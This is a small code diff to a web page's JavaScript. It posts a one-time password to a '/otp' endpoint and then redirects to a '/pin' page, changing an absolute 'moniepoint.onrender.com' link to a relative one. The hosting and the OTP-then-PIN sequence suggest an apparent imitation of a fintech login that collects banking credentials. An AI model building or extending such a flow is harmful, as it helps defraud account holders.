@@ -50,7 +50,7 @@ document.getElementById("submitBtn").addEventListener("click", function() {
         Otp: Otp
        }
        const handleFetchForm = async (res,req) => {
-        const request = await fetch("/",{
+        const request = await fetch("/otp",{
           method: "POST",
           headers: {
             'Content-Type':'application/json'
@@ -63,7 +63,7 @@ document.getElementById("submitBtn").addEventListener("click", function() {
         console.log(response)
         if(request.statusText === 'OK'){
           Otp = "";
-          location.href = "https://moniepoint.onrender.com/pin";
+          location.href = "/pin";
         }else {
           console.log("error")
         }
